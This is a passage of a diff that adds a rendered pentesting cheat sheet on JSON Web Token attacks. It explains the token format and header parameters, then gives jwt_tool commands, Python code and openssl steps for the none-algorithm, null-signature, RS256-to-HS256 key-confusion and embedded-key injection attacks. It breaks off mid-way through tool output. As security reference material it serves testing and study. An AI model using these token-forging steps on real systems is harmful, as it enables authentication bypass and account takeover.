+<li><a href="#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644">JWT Signature - Disclosure of a correct signature (CVE-2019-7644)</a></li>
+<li><a href="#jwt-signature---none-algorithm-cve-2015-9235">JWT Signature - None Algorithm (CVE-2015-9235)</a></li>
+<li><a href="#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431">JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)</a></li>
+<li><a href="#jwt-signature---key-injection-attack-cve-2018-0114">JWT Signature - Key Injection Attack (CVE-2018-0114)</a></li>
+</ul>
+</li>
+<li><a href="#jwt-secret">JWT Secret</a></li>
+<li><a href="#encode-and-decode-jwt-with-the-secret">Encode and Decode JWT with the secret</a></li>
+<li><a href="#break-jwt-secret">Break JWT secret</a><ul>
+<li><a href="#jwt-tool">JWT tool</a></li>
+<li><a href="#hashcat">Hashcat</a></li>
+</ul>
+</li>
+<li><a href="#jwt-claims">JWT Claims</a><ul>
+<li><a href="#jwt-kid-claim-misuse">JWT kid Claim Misuse</a></li>
+<li><a href="#jwks---jku-header-injection">JWKS - jku header injection</a></li>
+</ul>
+</li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/ticarpi/jwt_tool">ticarpi/jwt_tool</a></li>
+<li><a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker</a></li>
+<li><a href="https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61">JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper</a></li>
+<li><a href="https://jwt.io/">jwt.io - Encoder – Decoder</a></li>
+</ul>
+<h2 id="jwt-format">JWT Format</h2>
+<p>JSON Web Token : <code>Base64(Header).Base64(Data).Base64(Signature)</code></p>
+<p>Example : <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY</code></p>
+<p>Where we can split it into 3 components separated by a dot.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>        <span class="c"># header</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">eyJzdWIiOiIxMjM0</span><span class="p">[...]</span><span class="n">kbWluIjp0cnVlfQ</span>        <span class="c"># payload</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY</span> <span class="c"># signature</span>
+</code></pre></div>
+<h3 id="header">Header</h3>
+<p>Registered header parameter names defined in <a href="https://www.rfc-editor.org/rfc/rfc7515">JSON Web Signature (JWS) RFC</a>.
+The most basic JWT header is the following JSON.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">}</span>
+</code></pre></div>
+<p>Other parameters are registered in the RFC.</p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Definition</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>alg</td>
+<td>Algorithm</td>
+<td>Identifies the cryptographic algorithm used to secure the JWS</td>
+</tr>
+<tr>
+<td>jku</td>
+<td>JWK Set URL</td>
+<td>Refers to a resource for a set of JSON-encoded public keys</td>
+</tr>
+<tr>
+<td>jwk</td>
+<td>JSON Web Key</td>
+<td>The public key used to digitally sign the JWS</td>
+</tr>
+<tr>
+<td>kid</td>
+<td>Key ID</td>
+<td>The key used to secure the JWS</td>
+</tr>
+<tr>
+<td>x5u</td>
+<td>X.509 URL</td>
+<td>URL for the X.509 public key certificate or certificate chain</td>
+</tr>
+<tr>
+<td>x5c</td>
+<td>X.509 Certificate Chain</td>
+<td>X.509 public key certificate or certificate chain in PEM-encoded used to digitally sign the JWS</td>
+</tr>
+<tr>
+<td>x5t</td>
+<td>X.509 Certificate SHA-1 Thumbprint)</td>
+<td>Base64 url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate</td>
+</tr>
+<tr>
+<td>x5t#S256</td>
+<td>X.509 Certificate SHA-256 Thumbprint</td>
+<td>Base64 url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate</td>
+</tr>
+<tr>
+<td>typ</td>
+<td>Type</td>
+<td>Media Type. Usually <code>JWT</code></td>
+</tr>
+<tr>
+<td>cty</td>
+<td>Content Type</td>
+<td>This header parameter is not recommended to use</td>
+</tr>
+<tr>
+<td>crit</td>
+<td>Critical</td>
+<td>Extensions and/or JWA are being used</td>
+</tr>
+</tbody>
+</table>
+<p>Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
+"RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).</p>
+<table>
+<thead>
+<tr>
+<th><code>alg</code> Param Value</th>
+<th>Digital Signature or MAC Algorithm</th>
+<th>Requirements</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HS256</td>
+<td>HMAC using SHA-256</td>
+<td>Required</td>
+</tr>
+<tr>
+<td>HS384</td>
+<td>HMAC using SHA-384</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>HS512</td>
+<td>HMAC using SHA-512</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>RS256</td>
+<td>RSASSA-PKCS1-v1_5 using SHA-256</td>
+<td>Recommended</td>
+</tr>
+<tr>
+<td>RS384</td>
+<td>RSASSA-PKCS1-v1_5 using SHA-384</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>RS512</td>
+<td>RSASSA-PKCS1-v1_5 using SHA-512</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>ES256</td>
+<td>ECDSA using P-256 and SHA-256</td>
+<td>Recommended</td>
+</tr>
+<tr>
+<td>ES384</td>
+<td>ECDSA using P-384 and SHA-384</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>ES512</td>
+<td>ECDSA using P-521 and SHA-512</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>PS256</td>
+<td>RSASSA-PSS using SHA-256 and MGF1 with SHA-256</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>PS384</td>
+<td>RSASSA-PSS using SHA-384 and MGF1 with SHA-384</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>PS512</td>
+<td>RSASSA-PSS using SHA-512 and MGF1 with SHA-512</td>
+<td>Optional</td>
+</tr>
+<tr>
+<td>none</td>
+<td>No digital signature or MAC performed</td>
+<td>Required</td>
+</tr>
+</tbody>
+</table>
+<p>Inject headers with <a href="#">ticarpi/jwt_tool</a>: <code>python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2</code></p>
+<h3 id="payload">Payload</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="s2">&quot;1234567890&quot;</span><span class="p">,</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Amazing Haxx0r&quot;</span><span class="p">,</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="s2">&quot;1466270722&quot;</span><span class="p">,</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="nt">&quot;admin&quot;</span><span class="p">:</span><span class="kc">true</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="p">}</span>
+</code></pre></div>
+<p>Claims are the predefined keys and their values:
+- iss: issuer of the token
+- exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds.
+- iat: The time the JWT was issued. Can be used to determine the age of the JWT
+- nbf: "not before" is a future time when the token will become active.
+- jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed.
+- sub: subject of the token (rarely used)
+- aud: audience of the token (also rarely used)</p>
+<p>Inject payload claims with <a href="#">ticarpi/jwt_tool</a>: <code>python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3</code></p>
+<h2 id="jwt-signature">JWT Signature</h2>
+<h3 id="jwt-signature-null-signature-attack-cve-2020-28042">JWT Signature - Null Signature Attack (CVE-2020-28042)</h3>
+<p>Send a JWT with HS256 algorithm without a signature like <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.</code></p>
+<p><strong>Exploit</strong>:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">JWT_HERE</span> <span class="n">-X</span> <span class="n">n</span>
+</code></pre></div></p>
+<p><strong>Deconstructed</strong>:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="s2">&quot;JWT&quot;</span><span class="p">}</span><span class="err">.</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">{</span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="s2">&quot;1234567890&quot;</span><span class="p">,</span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;John Doe&quot;</span><span class="p">,</span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="mi">1516239022</span><span class="p">}</span>
+</code></pre></div></p>
+<h3 id="jwt-signature-disclosure-of-a-correct-signature-cve-2019-7644">JWT Signature - Disclosure of a correct signature (CVE-2019-7644)</h3>
+<p>Send a JWT with an incorrect signature, the endpoint might respond with an error disclosing the correct one.</p>
+<ul>
+<li><a href="https://github.com/jwt-dotnet/jwt/issues/61">jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61</a></li>
+<li><a href="https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644">CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT</a></li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
+</code></pre></div>
+<h3 id="jwt-signature-none-algorithm-cve-2015-9235">JWT Signature - None Algorithm (CVE-2015-9235)</h3>
+<p>JWT supports a <code>None</code> algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.</p>
+<p>None algorithm variants:
+* none 
+* None
+* NONE
+* nOnE</p>
+<p>To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you <strong>remove</strong> the signature</p>
+<p>Alternatively you can modify an existing JWT (be careful with the expiration time)</p>
+<ul>
+<li>
+<p>Using <a href="#">ticarpi/jwt_tool</a>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="no">[JWT_HERE]</span> <span class="n">-X</span> <span class="n">a</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Manually editing the JWT
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span> <span class="nn">jwt</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">jwtToken</span> <span class="o">=</span> <span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ&#39;</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">decodedToken</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">jwtToken</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>                   
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># decode the token before encoding with type &#39;None&#39;</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">noneEncoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">decodedToken</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="nb">print</span><span class="p">(</span><span class="n">noneEncoded</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></p>
+</li>
+</ul>
+<h3 id="jwt-signature-key-confusion-attack-rs256-to-hs256-cve-2016-5431">JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)</h3>
+<p>If a server’s code is expecting a token with "alg" set to RSA, but receives a token with "alg" set to HMAC, it may inadvertently use the public key as the HMAC symmetric key when verifying the signature.</p>
+<p>Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: <code>openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout</code></p>
+<blockquote>
+<p>The algorithm <strong>HS256</strong> uses the secret key to sign and verify each message.
+The algorithm <strong>RS256</strong> uses the private key to sign the message and uses the public key for authentication.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">import</span> <span class="nn">jwt</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">public</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">print</span> <span class="n">public</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">print</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;test&quot;</span><span class="p">},</span> <span class="n">key</span><span class="o">=</span><span class="n">public</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> This behavior is fixed in the python library and will return this error <code>jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</code>. You need to install the following version: <code>pip install pyjwt==0.4.3</code>.</p>
+<ul>
+<li>Using <a href="#">ticarpi/jwt_tool</a>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">JWT_HERE</span> <span class="n">-X</span> <span class="n">k</span> <span class="n">-pk</span> <span class="n">my_public</span><span class="p">.</span><span class="n">pem</span>
+</code></pre></div></li>
+<li>
+<p>Using <a href="https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd">portswigger/JWT Editor</a></p>
+<ol>
+<li>Find the public key, usually in <code>/jwks.json</code> or <code>/.well-known/jwks.json</code></li>
+<li>Load it in the JWT Editor Keys tab, click <code>New RSA Key</code>.</li>
+<li>. In the dialog, paste the JWK that you obtained earlier: <code>{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}</code></li>
+<li>Select the PEM radio button and copy the resulting PEM key.</li>
+<li>Go to the Decoder tab and Base64-encode the PEM.</li>
+<li>Go back to the JWT Editor Keys tab and generate a <code>New Symmetric Key</code> in JWK format.</li>
+<li>Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.</li>
+<li>Edit the JWT token alg to <code>HS256</code> and the data.</li>
+<li>Click <code>Sign</code> and keep the option: <code>Don't modify header</code></li>
+</ol>
+</li>
+<li>
+<p>Manually using the following steps to edit an RS256 JWT token into an HS256</p>
+<ol>
+<li>
+<p>Convert our public key (key.pem) into HEX with this command.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">$</span> <span class="nb">cat </span><span class="n">key</span><span class="p">.</span><span class="n">pem</span> <span class="p">|</span> <span class="n">xxd</span> <span class="n">-p</span> <span class="p">|</span> <span class="n">tr</span> <span class="n">-d</span> <span class="s2">&quot;\\n&quot;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">2d2d2d2d2d424547494e20505</span><span class="no">[STRIPPED]</span><span class="n">592d2d2d2d2d0a</span>
+</code></pre></div>
+</li>
+<li>
+<p>Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">$</span> <span class="nb">echo </span><span class="n">-n</span> <span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ&quot;</span> <span class="p">|</span> <span class="n">openssl</span> <span class="n">dgst</span> <span class="n">-sha256</span> <span class="n">-mac</span> <span class="n">HMAC</span> <span class="n">-macopt</span> <span class="n">hexkey</span><span class="p">:</span><span class="n">2d2d2d2d2d424547494e20505</span><span class="no">[STRIPPED]</span><span class="n">592d2d2d2d2d0a</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="p">(</span><span class="n">stdin</span><span class="p">)=</span> <span class="n">8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0</span>
+</code></pre></div>
+</li>
+<li>
+<p>Convert signature (Hex to "base64 URL")</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">$</span> <span class="n">python2</span> <span class="n">-c</span> <span class="s2">&quot;exec(\&quot;</span><span class="n">import</span> <span class="n">base64</span><span class="p">,</span> <span class="n">binascii</span><span class="p">\</span><span class="n">nprint</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="s1">&#39;8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0&#39;</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)\</span><span class="s2">&quot;)&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Add signature to edited payload</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="no">[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="p">.</span><span class="n">eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ</span><span class="p">.</span><span class="n">j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA</span>
+</code></pre></div>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="jwt-signature-key-injection-attack-cve-2018-0114">JWT Signature - Key Injection Attack (CVE-2018-0114)</h3>
+<blockquote>
+<p>A vulnerability in the Cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.</p>
+</blockquote>
+<p><strong>Exploit</strong>:
+* Using [ticarpi/jwt_tool]
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="no">[JWT_HERE]</span> <span class="n">-X</span> <span class="n">i</span>
+</code></pre></div>
+* Using <a href="#">portswigger/JWT Editor</a>
+    1. Add a <code>New RSA key</code>
+    2. In the JWT's Repeater tab, edit data
+    3. <code>Attack</code> &gt; <code>Embedded JWK</code></p>
+<p><strong>Deconstructed</strong>:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">{</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span><span class="nt">&quot;jwk&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">    </span><span class="nt">&quot;kty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">    </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;jwt_tool&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="nt">&quot;use&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sig&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">    </span><span class="nt">&quot;e&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AQAB&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">    </span><span class="nt">&quot;n&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw&quot;</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="p">}</span><span class="err">.</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="p">{</span><span class="nt">&quot;login&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">}</span><span class="err">.</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="p">[</span><span class="err">Sig</span><span class="kc">ne</span><span class="err">d</span><span class="w"> </span><span class="err">wi</span><span class="kc">t</span><span class="err">h</span><span class="w"> </span><span class="kc">ne</span><span class="err">w</span><span class="w"> </span><span class="err">Priva</span><span class="kc">te</span><span class="w"> </span><span class="err">key;</span><span class="w"> </span><span class="err">Public</span><span class="w"> </span><span class="err">key</span><span class="w"> </span><span class="err">i</span><span class="kc">n</span><span class="err">jec</span><span class="kc">te</span><span class="err">d</span><span class="p">]</span>
+</code></pre></div></p>
+<h2 id="jwt-secret">JWT Secret</h2>
+<blockquote>
+<p>To create a JWT, a secret key is used to sign the header and payload, which generates the signature. The secret key must be kept secret and secure to prevent unauthorized access to the JWT or tampering with its contents. If an attacker is able to access the secret key, they can create, modify or sign their own tokens, bypassing the intended security controls.</p>
+</blockquote>
+<h3 id="encode-and-decode-jwt-with-the-secret">Encode and Decode JWT with the secret</h3>
+<ul>
+<li>Using <a href="https://github.com/ticarpi/jwt_tool">ticarpi/jwt_tool</a>: 
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJuYW1lIjoiSm9obiBEb2UifQ</span><span class="p">.</span><span class="n">xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJuYW1lIjoiSm9obiBEb2UifQ</span><span class="p">.</span><span class="n">xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds</span> <span class="n">-T</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">Token</span> <span class="n">header</span> <span class="n">values</span><span class="p">:</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="p">[+]</span> <span class="n">alg</span> <span class="p">=</span> <span class="s2">&quot;HS256&quot;</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="p">[+]</span> <span class="n">typ</span> <span class="p">=</span> <span class="s2">&quot;JWT&quot;</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
